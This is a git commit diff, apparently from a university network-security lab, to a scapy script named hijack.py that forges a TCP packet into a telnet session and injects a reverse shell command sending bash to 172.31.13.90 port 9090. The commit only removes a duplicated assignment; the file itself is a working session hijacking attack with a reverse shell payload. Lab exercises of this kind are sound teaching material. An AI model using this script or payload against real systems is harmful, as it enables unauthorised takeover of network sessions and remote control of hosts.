997903f16e31e76c1537132723e6c7335d807e98
KyraZzz <yz709@cam.ac.uk>
2022-03-31 19:33:23 +0000

    bug fix for reverse shell

--- TCP/volumes/hijack.py
+++ TCP/volumes/hijack.py
@@ -2,7 +2,7 @@ from scapy.all import *
 
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
 tcp = TCP(sport=33748, dport=23, flags="A", seq=1843486262, ack=1268103583)
-data = data = "\n /bin/bash -i > /dev/tcp/172.31.13.90/9090 0<&1 2>&1\n"
+data = "\n /bin/bash -i > /dev/tcp/172.31.13.90/9090 0<&1 2>&1\n"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
